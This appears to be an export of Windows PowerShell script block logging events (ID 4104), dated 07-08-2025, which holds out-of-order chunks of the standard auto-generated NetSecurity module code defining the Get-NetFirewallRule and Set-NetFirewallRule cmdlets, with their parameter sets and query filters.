    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByDisplayGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewDisplayName')) {
            [object]$__cmdletization_value = ${NewDisplayName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Description')) {
            [object]$__cmdletization_value = ${Description}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Enabled')) {
            [object]$__cmdletization_value = ${Enabled}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Profile')) {
            [object]$__cmdletization_value = ${Profile}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Platform')) {
            [object]$__cmdletization_value = ${Platform}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platforms'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platforms'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Direction')) {
            [object]$__cmdletization_value = ${Direction}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Direction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Direction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Action')) {
            [object]$__cmdletization_value = ${Action}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (6 of 19):
rewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetFirewallRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetFirewallRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetFirewallRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallSecurityFilter') -and (@('ByAssociatedNetFirewallSecurityFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallSecurityFilter}, 'MSFT_NetFirewallRuleFilterBySecurity', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallServiceFilter') -and (@('ByAssociatedNetFirewallServiceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallServiceFilter}, 'MSFT_NetFirewallRuleFilterByService', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetFirewallRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallRule' -Alias '*'
        

function Set-NetFirewallRule
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByDisplayGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewDisplayName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled]
    ${Enabled},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile]
    ${Profile},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${Platform},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction]
    ${Direction},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${Action},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EdgeTraversal]
    ${EdgeTraversalPolicy},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('LSM')]
    [bool]
    ${LooseSourceMapping},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [bool]
    ${LocalOnlyMapping},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Owner},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${LocalAddress},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${RemoteAddress},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Protocol},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${LocalPort},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${RemotePort},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${IcmpType},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('DynamicTransport')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DynamicTransport]
    ${DynamicTarget},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Program},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Package},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Service},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [WildcardPattern[]]
    ${InterfaceAlias},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType]
    ${InterfaceType},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetN

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (5 of 19):
ocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetNetworkLayerSecurityFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallSecurityFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetServiceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallServiceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Direction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
